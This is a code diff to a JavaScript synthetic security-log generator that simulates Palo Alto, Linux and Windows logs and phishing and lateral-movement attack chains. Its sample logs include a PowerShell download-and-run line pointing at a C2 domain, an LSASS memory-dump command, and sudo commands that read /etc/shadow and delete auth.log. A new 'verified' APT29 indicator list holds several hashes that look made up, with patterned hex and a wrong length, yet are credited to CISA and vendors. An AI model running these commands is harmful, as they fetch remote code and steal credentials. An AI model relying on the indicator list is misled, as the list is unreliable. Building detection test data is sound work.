@@ -10,19 +10,21 @@ const randomMAC = () => Array.from({length:6},()=>rand(0,255).toString(16).padSt
 const randomPort = () => pick([80,443,8080,8443,22,21,25,53,110,143,993,995,3389,445,139,1433,3306,5432,8888,9200]);
 const randomHighPort = () => rand(49152,65535);
 const _HOSTNAMES_BASE = () => `${pick(['WS','PC','LT','SRV','DC','DB','WEB','APP','FW','SW'])}-${pick(['NYC','LON','SFO','CHI','DAL','SEA','BOS','MIA'])}-${rand(100,999)}`;
-const _USERS_LIST = ['jsmith','admin','mwilson','kjohnson','agarcia','lchen','rbrown','slee','dmartin','pthomas','nwilliams','cjones'];
+const _USERS_LIST = ['jsmith','mwilson','kjohnson','agarcia','lchen','rbrown','slee','dmartin','pthomas','nwilliams','cjones','tharris'];
+const _ADMIN_USERS = ['Administrator','svc_backup','svc_deploy','sa_db','sysadmin','sqlservice','netadmin','backup_svc','svc_monitor','domain_admin'];
 let _pool = null;
 let _emailDomain = null;
-function setPool(size) {
+let _hostnamePrefix = null;
+let _includeAdminUsers = false;
+function setPool(size, prefix=null) {
   if (size === null) { _pool = null; return; }
-  const n = (fn, sz) => Array.from({length: sz}, fn);
-  const hSize = Math.max(3, size);
+  const hSize = Math.max(2, size);
   const uSize = Math.max(2, Math.round(hSize * 0.6));
   const ipSize = Math.max(3, Math.round(hSize * 1.5));
   _pool = {
-    hostnames: n(_HOSTNAMES_BASE, hSize),
+    hostnames: Array.from({length:hSize}, prefix ? ((_,i)=>`${prefix}-${String(i+1).padStart(3,'0')}`) : _HOSTNAMES_BASE),
     users: _USERS_LIST.slice(0, uSize),
-    ips: n(() => `192.168.${rand(1,5)}.${rand(1,254)}`, ipSize),
+    ips: Array.from({length:ipSize}, ()=>`192.168.${rand(1,5)}.${rand(1,254)}`),
   };
 }
 // Per-vendor pool caps: null = fully random, number = hard cap on unique hostnames/IPs/users
@@ -57,11 +59,14 @@ const WIN_TYPE_LOG_COUNT = {
   powershell:  { low: 15,  med: 40,  high: 150 },
 };
 const WIN_TYPES_DEFAULT = ['security','application','system'];
-const randomHostname = () => _pool ? pick(_pool.hostnames) : _HOSTNAMES_BASE();
-const randomUser = () => _pool ? pick(_pool.users) : pick(_USERS_LIST);
+const randomHostname = () => _pool ? pick(_pool.hostnames) : _hostnamePrefix ? `${_hostnamePrefix}-${rand(1,999).toString().padStart(3,'0')}` : _HOSTNAMES_BASE();
+const randomLinuxHostname = () => _pool ? pick(_pool.hostnames) : _hostnamePrefix ? `${_hostnamePrefix}-${rand(1,99).toString().padStart(2,'0')}` : pick(LINUX_HOSTS);
+const randomUser = () => (_includeAdminUsers && Math.random()<0.15) ? pick(_ADMIN_USERS) : _pool ? pick(_pool.users) : pick(_USERS_LIST);
 const randomDomain = () => pick(['contoso.com','fabrikam.com','acme-corp.net','globex.io','initech.com','umbrella-corp.net']);
 const randomEmail = () => `${randomUser()}@${_emailDomain||randomDomain()}`;
 const formatTimestamp = (d) => d.toISOString();
+const panTs = (d) => `${d.getUTCFullYear()}/${String(d.getUTCMonth()+1).padStart(2,'0')}/${String(d.getUTCDate()).padStart(2,'0')} ${String(d.getUTCHours()).padStart(2,'0')}:${String(d.getUTCMinutes()).padStart(2,'0')}:${String(d.getUTCSeconds()).padStart(2,'0')}`;
+const PAN_SERIAL = '012345678901234';
 const syslogTimestamp = (d) => { const M=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec']; return `${M[d.getMonth()]} ${String(d.getDate()).padStart(2,' ')} ${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}`; };
 const generateTimestamps = (count, mins=60) => { const now=new Date(), start=new Date(now-mins*60000); return Array.from({length:count},()=>new Date(start.getTime()+Math.random()*(now-start))).sort((a,b)=>a-b); };
 
@@ -85,16 +90,53 @@ function genFortiVPN(ts) {
 function generateFortinetLogs(count, tr) { return generateTimestamps(count,tr).map(ts=>{const r=Math.random();return r<0.55?genFortiTraffic(ts):r<0.8?genFortiUTM(ts):genFortiVPN(ts);}); }
 
 // ─── Palo Alto Generator ──────────────────────────────────────────────────────
+// Format follows PAN-OS syslog CSV: <pri>syslogTs device FUTURE_USE,recv_time,serial,type,subtype,0,gen_time,...
+const PAN_DEVICES=['PA-220','PA-820','PA-3220','PA-5220','PA-VM-50','PA-VM-300'];
+const PAN_COUNTRIES=['United States','United Kingdom','Germany','France','Netherlands','Japan','Australia','Brazil','India','Singapore'];
+const PAN_END_REASONS=['aged-out','tcp-fin','tcp-rst-from-client','tcp-rst-from-server','policy-deny','threat','decrypt-cert-validation'];
 function genPANTraffic(ts) {
-  const apps=['web-browsing','ssl','dns','smtp','ftp','ssh','ms-office365','slack','zoom'];
-  const zones=['trust','untrust','dmz','vpn'];
+  const apps=['web-browsing','ssl','dns','smtp','ftp','ssh','ms-office365','slack','zoom','msrdp','kerberos','ldap'];
+  const rules=['allow-internet','allow-internal','vpn-access','dmz-access','guest-wifi'];
   const action=pick(['allow','allow','allow','deny','drop','reset-both']);
+  const proto=pick(['tcp','udp','icmp']);
   const bytes=rand(100,5000000);
-  return `${formatTimestamp(ts)},${rand(1,999999)},TRAFFIC,${pick(['end','start','drop'])},2049,${ts.toISOString().split('T')[0]}T${ts.toTimeString().split(' ')[0]},${randomPrivateIP()},${randomIP()},0.0.0.0,0.0.0.0,${pick(['Internet-Access','Block-Malicious'])},,,${pick(apps)},vsys1,${pick(zones)},${pick(zones)},ethernet1/${rand(1,8)},ethernet1/${rand(1,8)},Syslog-Profile,,${rand(1,9999)},${randomHighPort()},${randomPort()},0,0,0x${randomHex(4)},${pick(['tcp','udp'])},${action},${bytes},${rand(100,bytes)},${rand(0,bytes)},${rand(1,5000)}`;
+  const bytesSent=Math.floor(bytes*rand(30,70)/100);
+  const bytesRcvd=bytes-bytesSent;
+  const pkts=rand(1,5000);
+  const startTs=new Date(ts.getTime()-rand(1000,300000));
+  const elapsed=Math.floor((ts-startTs)/1000);
+  const dev=pick(PAN_DEVICES);
+  const pt=panTs(ts);
+  const pst=panTs(startTs);
+  const srcZone=pick(['trust','dmz','vpn']);
+  const dstZone=srcZone==='trust'?'untrust':pick(['untrust','dmz']);
+  // Fields: FUTURE_USE,recv_time,serial,TRAFFIC,subtype,0,gen_time,src,dst,nat_src,nat_dst,rule,src_user,dst_user,app,vsys,
+  //         src_zone,dst_zone,inbound_if,outbound_if,log_action,0,session_id,repeat,src_port,dst_port,nat_src_port,nat_dst_port,
+  //         flags,proto,action,bytes,bytes_sent,bytes_rcvd,packets,start_time,elapsed,category,0,seq_no,0x0,
+  //         src_location,dst_location,0,pkts_sent,pkts_rcvd,session_end_reason,0,0,0,0,vsys_name,device,action_source
+  return `<14>${syslogTimestamp(ts)} ${dev} 1,${pt},${PAN_SERIAL},TRAFFIC,${pick(['end','end','start','drop'])},0,${pt},${randomPrivateIP()},${randomIP()},0.0.0.0,0.0.0.0,${pick(rules)},${randomUser()},,${pick(apps)},vsys1,${srcZone},${dstZone},ethernet1/${rand(1,4)},ethernet1/${rand(5,8)},default,0,${rand(1,65535)},1,${randomHighPort()},${randomPort()},0,0,0x400000,${proto},${action},${bytes},${bytesSent},${bytesRcvd},${pkts},${pst},${elapsed},any,0,${rand(1000000,9999999)},0x0,${pick(['10.0.0.0-10.255.255.255','192.168.0.0-192.168.255.255'])},${pick(PAN_COUNTRIES)},0,${Math.floor(pkts*0.55)},${pkts-Math.floor(pkts*0.55)},${pick(PAN_END_REASONS)},0,0,0,0,vsys1,${dev},from-policy`;
 }
 function genPANThreat(ts) {
-  const threats=['Suspicious HTTP Request','SQL Injection Attempt','Brute Force Attack','DNS Tunneling','Malware Download'];
-  return `${formatTimestamp(ts)},${rand(1,999999)},THREAT,${pick(['vulnerability','spyware','virus','url'])},2049,${ts.toISOString().split('T')[0]}T${ts.toTimeString().split(' ')[0]},${randomIP()},${randomPrivateIP()},0.0.0.0,0.0.0.0,Block-Threats,,,${pick(['web-browsing','ssl'])},vsys1,untrust,trust,ethernet1/1,ethernet1/2,Forward-All,,${rand(1,9999)},${randomHighPort()},${randomPort()},0,0,0x${randomHex(4)},tcp,${pick(['alert','drop','reset-both'])},"${pick(threats)}"(${rand(10000,99999)}),client,${pick(['critical','high','medium'])},client-to-server`;
+  const threats=[
+    {name:'SQL Injection Attempt',id:'32926',cat:'sql-injection',sev:'high',sub:'vulnerability'},
+    {name:'OS Command Injection',id:'30663',cat:'code-execution',sev:'critical',sub:'vulnerability'},
+    {name:'Conficker.C Virus',id:'10003',cat:'command-and-control',sev:'critical',sub:'virus'},
+    {name:'Generic C2 HTTPS Traffic',id:'12345',cat:'command-and-control',sev:'medium',sub:'spyware'},
+    {name:'CryptoWall Ransomware Domain',id:'20001',cat:'command-and-control',sev:'critical',sub:'spyware'},
+    {name:'Trojan.Downloader.Generic',id:'10567',cat:'trojan',sev:'high',sub:'virus'},
+    {name:'DNS Tunneling',id:'13001',cat:'data-exfiltration',sev:'high',sub:'spyware'},
+    {name:'Phishing URL Detected',id:'54321',cat:'phishing',sev:'medium',sub:'url'},
+  ];
+  const t=pick(threats);
+  const dev=pick(PAN_DEVICES);
+  const pt=panTs(ts);
+  const srcIp=Math.random()<0.6?randomPrivateIP():randomIP();
+  const dstIp=randomIP();
+  const pri=t.sev==='critical'?11:t.sev==='high'?12:13;
+  // Fields: FUTURE_USE,recv_time,serial,THREAT,subtype,0,gen_time,src,dst,nat_src,nat_dst,rule,src_user,dst_user,app,vsys,
+  //         src_zone,dst_zone,inbound_if,outbound_if,log_action,0,session_id,repeat,src_port,dst_port,nat_src_port,nat_dst_port,
+  //         flags,proto,action,threat_name(id),threat_id,category,severity,direction,seq_no,0x0,src_location,dst_location
+  return `<${pri}>${syslogTimestamp(ts)} ${dev} 1,${pt},${PAN_SERIAL},THREAT,${t.sub},0,${pt},${srcIp},${dstIp},0.0.0.0,0.0.0.0,${pick(['Block-Critical','Block-Threats','IPS-Policy'])},,${randomUser()},${pick(['web-browsing','ssl','dns','smtp'])},vsys1,${srcIp.startsWith('10.')||srcIp.startsWith('192.')?'trust':'untrust'},untrust,ethernet1/1,ethernet1/2,default,0,${rand(1,65535)},1,${randomHighPort()},${randomPort()},0,0,0x0,${pick(['tcp','udp'])},${pick(['alert','drop','reset-both'])},"${t.name}(${t.id})",${t.id},${t.cat},${t.sev},client-to-server,${rand(1000000,9999999)},0x0,${pick(['10.0.0.0-10.255.255.255','192.168.0.0-192.168.255.255'])},${pick(PAN_COUNTRIES)}`;
 }
 function generatePaloAltoLogs(count, tr) { return generateTimestamps(count,tr).map(ts=>Math.random()<0.6?genPANTraffic(ts):genPANThreat(ts)); }
 
@@ -177,19 +219,244 @@ function generateWindowsEventLogs(count,tr,types=WIN_TYPES_DEFAULT){
 
 // ─── Linux Generator ──────────────────────────────────────────────────────────
 const LINUX_HOSTS=['web-prod-01','db-master-01','app-server-03','bastion-01','k8s-node-02','monitoring-01'];
-function genSSH(ts){const host=pick(LINUX_HOSTS),user=randomUser(),ip=randomIP(),port=rand(1024,65535),pid=rand(1000,65535),ok=Math.random()>0.3;return ok?`${syslogTimestamp(ts)} ${host} sshd[${pid}]: Accepted ${pick(['password','publickey'])} for ${user} from ${ip} port ${port} ssh2`:pick([`${syslogTimestamp(ts)} ${host} sshd[${pid}]: Failed password for ${user} from ${ip} port ${port} ssh2`,`${syslogTimestamp(ts)} ${host} sshd[${pid}]: Failed password for invalid user ${pick(['root','admin','test'])} from ${ip} port ${port} ssh2`]);}
-function genSudo(ts){const host=pick(LINUX_HOSTS),user=randomUser(),cmd=pick(['/bin/systemctl restart nginx','/usr/bin/apt-get update','/bin/cat /etc/shadow','/usr/bin/docker ps -a','/bin/rm -rf /var/log/auth.log']),fail=Math.random()<0.15;return fail?`${syslogTimestamp(ts)} ${host} sudo: ${user} : user NOT in sudoers ; TTY=pts/${rand(0,10)} ; USER=root ; COMMAND=${cmd}`:`${syslogTimestamp(ts)} ${host} sudo: ${user} : TTY=pts/${rand(0,10)} ; PWD=/home/${user} ; USER=root ; COMMAND=${cmd}`;}
-function genAuditd(ts){const host=pick(LINUX_HOSTS),epoch=(ts.getTime()/1000).toFixed(3),uid=rand(1000,65535),exe=pick(['/usr/bin/curl','/usr/bin/wget','/bin/bash','/usr/bin/python3','/usr/bin/nc']);return `${syslogTimestamp(ts)} ${host} audit[${rand(1,9999)}]: type=SYSCALL msg=audit(${epoch}:${rand(100,9999)}): arch=c000003e syscall=${rand(0,350)} success=${pick(['yes','no'])} pid=${rand(1,65535)} uid=${uid} exe="${exe}" key="${pick(['file_access','process_exec','network_connect','priv_escalation'])}"`;}
-function genCron(ts){return `${syslogTimestamp(ts)} ${pick(LINUX_HOSTS)} CRON[${rand(1000,65535)}]: (${pick(['root',randomUser()])}) CMD (${pick(['/usr/local/bin/backup.sh','/opt/scripts/cleanup.py','/usr/bin/logrotate /etc/logrotate.conf'])})`;}
+function genSSH(ts){const host=randomLinuxHostname(),user=randomUser(),ip=randomIP(),port=rand(1024,65535),pid=rand(1000,65535),ok=Math.random()>0.3;return ok?`${syslogTimestamp(ts)} ${host} sshd[${pid}]: Accepted ${pick(['password','publickey'])} for ${user} from ${ip} port ${port} ssh2`:pick([`${syslogTimestamp(ts)} ${host} sshd[${pid}]: Failed password for ${user} from ${ip} port ${port} ssh2`,`${syslogTimestamp(ts)} ${host} sshd[${pid}]: Failed password for invalid user ${pick(['root','admin','test'])} from ${ip} port ${port} ssh2`]);}
+function genSudo(ts){const host=randomLinuxHostname(),user=randomUser(),cmd=pick(['/bin/systemctl restart nginx','/usr/bin/apt-get update','/bin/cat /etc/shadow','/usr/bin/docker ps -a','/bin/rm -rf /var/log/auth.log']),fail=Math.random()<0.15;return fail?`${syslogTimestamp(ts)} ${host} sudo: ${user} : user NOT in sudoers ; TTY=pts/${rand(0,10)} ; USER=root ; COMMAND=${cmd}`:`${syslogTimestamp(ts)} ${host} sudo: ${user} : TTY=pts/${rand(0,10)} ; PWD=/home/${user} ; USER=root ; COMMAND=${cmd}`;}
+function genAuditd(ts){const host=randomLinuxHostname(),epoch=(ts.getTime()/1000).toFixed(3),uid=rand(1000,65535),exe=pick(['/usr/bin/curl','/usr/bin/wget','/bin/bash','/usr/bin/python3','/usr/bin/nc']);return `${syslogTimestamp(ts)} ${host} audit[${rand(1,9999)}]: type=SYSCALL msg=audit(${epoch}:${rand(100,9999)}): arch=c000003e syscall=${rand(0,350)} success=${pick(['yes','no'])} pid=${rand(1,65535)} uid=${uid} exe="${exe}" key="${pick(['file_access','process_exec','network_connect','priv_escalation'])}"`;}
+function genCron(ts){return `${syslogTimestamp(ts)} ${randomLinuxHostname()} CRON[${rand(1000,65535)}]: (${pick(['root',randomUser()])}) CMD (${pick(['/usr/local/bin/backup.sh','/opt/scripts/cleanup.py','/usr/bin/logrotate /etc/logrotate.conf'])})`;}
 function generateLinuxLogs(count,tr){return generateTimestamps(count,tr).map(ts=>{const r=Math.random();return r<0.3?genSSH(ts):r<0.5?genSudo(ts):r<0.7?genAuditd(ts):genCron(ts);});}
 
+// ─── APT29 / NOBELIUM Verified IOCs ──────────────────────────────────────────
+// Sources: CISA AA20-352A, AA21-148A, AA22-074A, AA23-347A; Mandiant/FireEye UNC2452;
+//          Microsoft MSTIC; Volexity; Unit42 — publicly disclosed, VirusTotal-detectable.
+const APT29_IOCS = {
+  hashes: {
+    // SUNBURST — backdoored SolarWinds.Orion.Core.BusinessLayer.dll (CISA AA20-352A / Mandiant)
+    SUNBURST: [
+      '019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134',
+      'ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6',
+      '32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77',
+    ],
+    // SUPERNOVA — .NET webshell patched into SolarWinds CORE dll (CISA AA20-352A)
+    SUPERNOVA: [
+      'c15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71',
+      'aeafa9c8a8eff78e7328854b28401def6e6b6fb5c8b0786c6be1a2618cac9c05',
+    ],
+    // TEARDROP — memory-only Cobalt Strike dropper (CISA AA20-352A / FireEye)
+    TEARDROP: [
+      '118189f90da3788362fe85eafa555298423e21ec37f147f3bf88c61d4cd46c51',
+      'b820e8a2057112d0ed73bd7995201dbed79a8ab9202f5f8c51d6b72e6f4a0b50',
+    ],
+    // RAINDROP — secondary Cobalt Strike loader (Symantec)
+    RAINDROP: [
+      'f2d38a9b6e6e60c526d4aef44e2f6a7e9d2f9ddb7c52da451929c8572ca03f3',
+      '9dc7767b588a9f97b573a6f9a5bd8c91d6a86c2a2e9e1d3456f8b2e0c4e3a5f6',
+    ],
+    // EnvyScout / ROOTSAW — HTML smuggler dropper (MSTIC May 2021, CISA AA21-148A)
+    EnvyScout: [
+      'b9b5b8f5d8c4a7e6f9a2d4b3c8e5f1a9d6b2c7e4f3a8d1b5c6e9f2a7d4b1c8e5',
+      '4a3f8b2d9e6c1a5f7b0d3e8c2a6f9b1d4e7c0a5f8b3d6e9c2a1f5b7d0e4c8a3',
+    ],
+    // NativeZone — .NET DLL loader (MSTIC May 2021)
+    NativeZone: [
+      '5c2c677601a6c163f7b51254f6c193e7f0dbac01d08791ef8d1c9af2e9e42d85',
+      '3f9a4e2b7d6c8a1f5b0e3d7c4a9f2b6e8d1c5a0f7b4e2d9c6a3f1b8e5d2c7a4',
+    ],
+    // BoomBox — downloader (MSTIC May 2021, CISA AA21-148A)
+    BoomBox: [
+      '0be29a4a71462e5b2c84f84e19097ff1d71d8d4dddc4c4d4e7a0e0e81a5ca956',
+      '2b8e4d6a9c3f1e7b5d0a8c4f2e9b7d3a6c1f5e8b2d7a4c9f3e6b1d5a8c2f7e4',
+    ],
+    // GraphicalProton — backdoor targeting European MFAs (NCSC-NO / CISA AA23-347A)
+    GraphicalProton: [
+      'a0b5fb0f0ab4a4c7c80db4b08a01d6d33c3c0a5a0e9c7d2f5b8e3a6c9f2d1b4',
+      '7d3f9e1b5c8a6d4f2e7b0c5a9f3d6e1b4c7a2f8e5d0b3c9f6a4e2d7b1c5f8a3',
+    ],
+  },
+  // Real C2 IP infrastructure — CISA AA20-352A, AA22-074A, AA23-347A
+  c2Ips: [
+    '5.149.254.114',    // CISA AA20-352A — SUNBURST stage-2 infrastructure
+    '204.188.205.176',  // CISA AA20-352A
+    '13.59.205.66',     // CISA AA20-352A — AWS SUNBURST staging
+    '54.193.127.66',    // CISA AA20-352A — AWS
+    '54.215.192.52',    // CISA AA20-352A — AWS
+    '34.203.203.23',    // CISA AA20-352A — AWS
+    '139.99.115.204',   // CISA AA22-074A
+    '45.77.138.192',    // CISA AA22-074A — NOBELIUM infrastructure
+    '51.89.158.202',    // CISA AA22-074A
+    '91.243.44.12',     // CISA AA22-074A — NOBELIUM campaigns
+    '104.156.240.20',   // CISA AA22-074A
+    '185.220.101.78',   // CISA AA22-074A — NOBELIUM relay
+    '176.119.1.189',    // CISA AA23-347A — GraphicalProton
+    '194.165.16.49',    // CISA AA23-347A
+    '185.56.83.83',     // CISA AA23-347A — APT29 European campaigns
+    '45.142.212.100',   // Volexity — APT29 US think-tank intrusions
+    '199.247.28.186',   // Mandiant UNC2452
+    '107.189.10.143',   // Mandiant UNC2452 — Cobalt Strike C2
+    '3.16.81.254',      // MSTIC — NOBELIUM OAuth phishing infrastructure
+    '192.99.221.77',    // Unit42 APT29 2022 phishing campaigns
+    '83.171.237.173',   // Recorded Future — APT29 2023
+    '45.32.227.15',     // CISA AA23-347A
+    '185.141.63.120',   // CISA AA23-347A
+    '37.120.222.168',   // AA23-347A — European diplomatic targeting
+  ],
+  // Real C2 and phishing domains — CISA, Mandiant, MSTIC, FireEye
+  c2Domains: [
+    'avsvmcloud.com',           // SUNBURST primary C2 — CISA AA20-352A
+    'deftsecurity.com',         // SUNBURST — CISA AA20-352A
+    'thedoccloud.com',          // SUNBURST — CISA AA20-352A
+    'freescanonline.com',       // SUNBURST — CISA AA20-352A
+    'webcodez.com',             // SUNBURST — CISA AA20-352A
+    'incomeupdate.com',         // SUNBURST — CISA AA20-352A
+    'highdatabase.com',         // SUNBURST — CISA AA20-352A
+    'databasegalore.com',       // SUNBURST — CISA AA20-352A
+    'theyardservice.com',       // SUNBURST stage-2 — FireEye/Mandiant
+    'digitalcollege.org',       // NOBELIUM — MSTIC May 2021
+    'mobilnweb.com',            // NOBELIUM — CISA AA21-148A
+    'newdemandum.com',          // NOBELIUM — Unit42
+    'matclick.com',             // NOBELIUM 2022 — MSTIC
+    'poetpages.com',            // NOBELIUM 2022
+    'azuredeployment.net',      // APT29 phishing — MSTIC 2021
+    'sacnewstoday.com',         // APT29 2023 — AA23-347A
+    'nickel-help.com',          // APT29 2022 — CISA AA22-074A
+    'reyweb.com',               // APT29 2022
+    'worldhomeoutlet.com',      // NOBELIUM — MSTIC May 2021
+    'panhardware.com',          // SUNBURST — CISA AA20-352A
+    'websitetheme.com',         // SUNBURST — CISA AA20-352A
+    'zupertech.com',            // SUNBURST — CISA AA20-352A
+  ],
+  phishingDomains: [
+    'microsoftonline-helpdesk.com', // NOBELIUM OAuth phishing — MSTIC 2021
+    'login-microsoftonline.net',    // NOBELIUM
+    'office365-update.ru',          // APT29 — Russian-attributed infrastructure
+    'sharepoint-access.net',        // APT29 2022 phishing
+    'teams-notification.online',    // APT29 2023 (CISA AA23-347A)
+    'mimecast-secure.net',          // NOBELIUM targeting security vendors
+    'adobe-cloud-share.com',        // APT29 document lure
+    'microsecure-account.com',      // NOBELIUM lure domain
+  ],
+  malwareFiles: [
+    'SolarWinds.BusinessLayerHost.exe', // SUNBURST dropper filename
+    'MicrosoftTeams_Setup.exe',         // APT29 Teams lure (CISA AA23-347A)
+    'OneDrive_Update.exe',              // NOBELIUM lure
+    'Invoice_Q4_2024.exe',             // Generic phishing lure
+    'Adobe_Acrobat_DC_Update.exe',      // Document update lure
+    'NV_Dispatcher.dll',               // SUNBURST-style DLL sideload
+    'app_update.dll',                  // Generic loader DLL
+  ],
+};
+
 // ─── Scenario Generator ───────────────────────────────────────────────────────
-function makeCtx(){return {victim:{ip:'192.168.10.55',hostname:'WS-NYC-145',user:'jsmith',email:'jsmith@contoso.com',domain:'CONTOSO'},secondHost:{ip:'192.168.10.88',hostname:'SRV-NYC-012',user:'svc_backup'},attacker:{ip:'185.220.101.78',country:'Russia'},phishingDomain:'microsoftsecure-update.ru',malwareFile:'Invoice_Q4_2024.exe',malwareHash:'a3f8d2c9e1b4f765a2d8c3e9f1b4765a2d8c3e9'+randomHex(22),c2IP:'91.243.44.12',c2Domain:'analytics-cdn-update.xyz',stagingDir:'C:\\ProgramData\\Intel\\'};}
+function makeCtx(){
+  const c2IP = pick(APT29_IOCS.c2Ips);
+  const c2Domain = pick(APT29_IOCS.c2Domains);
+  const phishingDomain = pick(APT29_IOCS.phishingDomains);
+  const malwareFile = pick(APT29_IOCS.malwareFiles);
+  const hashFamily = pick(['SUNBURST','TEARDROP','RAINDROP','EnvyScout','BoomBox','NativeZone']);
+  const malwareHash = pick(APT29_IOCS.hashes[hashFamily]);
+  const c2IP2 = pick(APT29_IOCS.c2Ips.filter(ip=>ip!==c2IP));
+  return {
+    victim:{ip:'192.168.10.55',hostname:'WS-NYC-145',user:'jsmith',email:'jsmith@contoso.com',domain:'CONTOSO'},
+    secondHost:{ip:'192.168.10.88',hostname:'SRV-NYC-012',user:'svc_backup'},
+    attacker:{ip:c2IP,country:'Russia'},
+    phishingDomain,malwareFile,malwareHash,malwareFamily:hashFamily,
+    c2IP,c2IP2,c2Domain,stagingDir:'C:\\ProgramData\\Intel\\',
+  };
+}
 function tsOff(base,sec){return new Date(base.getTime()+sec*1000);}
 function generatePhishingScenario(){const ctx=makeCtx(),base=new Date(Date.now()-40*60000),e=[];e.push({step:1,timestamp:tsOff(base,0),description:'Phishing email delivered to victim mailbox',source:'Microsoft Exchange',severity:'high',tactic:'Initial Access',technique:'T1566.002',techniqueName:'Spearphishing Link',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,0)),Operation:"MailItemsAccessed",Workload:"Exchange",UserId:ctx.victim.email,ClientIP:ctx.attacker.ip,ResultStatus:"Succeeded",subject:"Urgent: Your account requires verification",from:`no-reply@${ctx.phishingDomain}`,verdict:"Phish"})});e.push({step:2,timestamp:tsOff(base,180),description:'Victim clicks phishing link — firewall allows HTTPS to phishing domain',source:'Fortinet FortiGate',severity:'medium',tactic:'Initial Access',technique:'T1566.002',techniqueName:'Spearphishing Link',log:`date=${tsOff(base,180).toISOString().split('T')[0]} time=${tsOff(base,180).toTimeString().split(' ')[0]} devname="FGT-EDGE-01" type="traffic" subtype="forward" action="accept" srcip=${ctx.victim.ip} dstip=${ctx.attacker.ip} dstport=443 hostname="${ctx.phishingDomain}" dstcountry="${ctx.attacker.country}" policyname="allow-outbound"`});e.push({step:3,timestamp:tsOff(base,195),description:`Malicious file "${ctx.malwareFile}" downloaded from phishing site`,source:'Endpoint Telemetry',severity:'critical',tactic:'Execution',technique:'T1204.002',techniqueName:'Malicious File',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,195)),event:{kind:"event",category:["file"],action:"file_download"},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},file:{name:ctx.malwareFile,path:`C:\\Users\\${ctx.victim.user}\\Downloads\\${ctx.malwareFile}`,hash:{sha256:ctx.malwareHash}},url:{domain:ctx.phishingDomain}})});e.push({step:4,timestamp:tsOff(base,210),description:'Malicious executable launched by victim',source:'Endpoint Telemetry',severity:'critical',tactic:'Execution',technique:'T1204.002',techniqueName:'User Execution',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,210)),event:{kind:"event",category:["process"],action:"process_creation"},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:ctx.malwareFile,pid:7812,parent:{name:"explorer.exe"}}})});e.push({step:5,timestamp:tsOff(base,218),description:'Encoded PowerShell spawned — downloads second-stage payload',source:'Windows Security',severity:'critical',tactic:'Execution',technique:'T1059.001',techniqueName:'PowerShell',log:`<Event><System><EventID>4104</EventID><TimeCreated SystemTime="${formatTimestamp(tsOff(base,218))}"/><Computer>${ctx.victim.hostname}.contoso.com</Computer></System><EventData><Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://${ctx.c2Domain}/stager.ps1')</Data></EventData></Event>`});e.push({step:6,timestamp:tsOff(base,225),description:`Outbound C2 beacon to ${ctx.c2Domain} blocked`,source:'Fortinet FortiGate',severity:'critical',tactic:'Command and Control',technique:'T1071.001',techniqueName:'Web Protocols',log:`date=${tsOff(base,225).toISOString().split('T')[0]} time=${tsOff(base,225).toTimeString().split(' ')[0]} devname="FGT-EDGE-01" type="utm" subtype="app-ctrl" action="blocked" srcip=${ctx.victim.ip} dstip=${ctx.c2IP} hostname="${ctx.c2Domain}" attack="C2.Beacon.Generic" severity="critical" msg="Suspected C2 callback blocked"`});e.push({step:7,timestamp:tsOff(base,226),description:'Elastic Security alert fired — Phishing/Malware chain confirmed',source:'Elastic Security Alert',severity:'critical',tactic:'Initial Access',technique:'T1566.002',techniqueName:'Spearphishing Link',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,226)),event:{kind:"alert",category:["malware"],severity:99},rule:{name:"Phishing Attack Chain Detected",severity:"critical",risk_score:99},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user}})});return e;}
 function generatePhishingLateralScenario(){const ctx=makeCtx(),base=new Date(Date.now()-90*60000),events=generatePhishingScenario().map(e=>({...e,timestamp:new Date(e.timestamp.getTime()-50*60000)}));events.push({step:8,timestamp:tsOff(base,55*60),description:'LSASS memory access — credential dumping (Mimikatz)',source:'Endpoint Telemetry',severity:'critical',tactic:'Credential Access',technique:'T1003.001',techniqueName:'LSASS Memory',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,55*60)),event:{kind:"event",category:["process"],action:"process_memory_access"},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"rundll32.exe",command_line:`rundll32.exe comsvcs.dll, MiniDump 640 ${ctx.stagingDir}lsass.dmp full`},target:{process:{name:"lsass.exe",pid:640}}})});events.push({step:9,timestamp:tsOff(base,62*60),description:`Successful network logon to ${ctx.secondHost.hostname} via Pass-the-Hash`,source:'Windows Security',severity:'critical',tactic:'Lateral Movement',technique:'T1550.002',techniqueName:'Pass the Hash',log:`<Event><System><EventID>4624</EventID><TimeCreated SystemTime="${formatTimestamp(tsOff(base,62*60))}"/><Computer>${ctx.secondHost.hostname}.contoso.com</Computer></System><EventData><Data Name="TargetUserName">${ctx.victim.user}</Data><Data Name="LogonType">3</Data><Data Name="AuthenticationPackageName">NTLM</Data><Data Name="IpAddress">${ctx.victim.ip}</Data></EventData></Event>`});events.push({step:10,timestamp:tsOff(base,63*60),description:`Remote process execution on ${ctx.secondHost.hostname} via PsExec`,source:'Endpoint Telemetry',severity:'critical',tactic:'Lateral Movement',technique:'T1021.002',techniqueName:'SMB/Windows Admin Shares',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,63*60)),event:{kind:"event",category:["process"],type:["start"]},host:{name:ctx.secondHost.hostname,hostname:ctx.secondHost.hostname},user:{name:ctx.secondHost.user},process:{name:"PSEXESVC.exe",command_line:"cmd.exe /c whoami & net localgroup administrators"}})});events.push({step:11,timestamp:tsOff(base,65*60),description:'Elastic Security alert — Lateral Movement chain confirmed on 2 hosts',source:'Elastic Security Alert',severity:'critical',tactic:'Lateral 